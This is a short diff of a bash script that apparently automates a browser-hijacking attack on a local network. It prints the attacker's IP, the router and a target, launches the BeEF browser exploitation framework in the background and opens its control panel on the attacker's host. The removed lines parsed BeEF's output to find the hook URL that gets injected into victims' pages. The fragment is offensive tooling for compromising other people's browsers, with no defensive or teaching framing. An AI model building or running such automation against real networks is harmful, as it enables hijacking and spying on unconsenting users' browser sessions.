@@ -22,19 +22,9 @@ echo "Your IP is $yours, Router is $router, Target is $target"
 
 
 echo "Starting BeEF ... "
-cd /usr/share/beef-xss
-./beef > /root/Desktop/boutput.txt
-#BeEf output in boutput.txt
-#parse obutput.txt
-r=Hook 
-wait
-cat /root/Desktop/boutput.txt | while read i
-do 
-if [ ! "${i/$r}" = "$i" ] ; then
-#the second echo is our hook url
-echo "$i"
-fi 
-done
+cd /usr/share/beef-xss/; ./beef &
+
+sleep 50
 
 xvar="http://$yours:3000/ui/panel"
 xdg-open $xvar
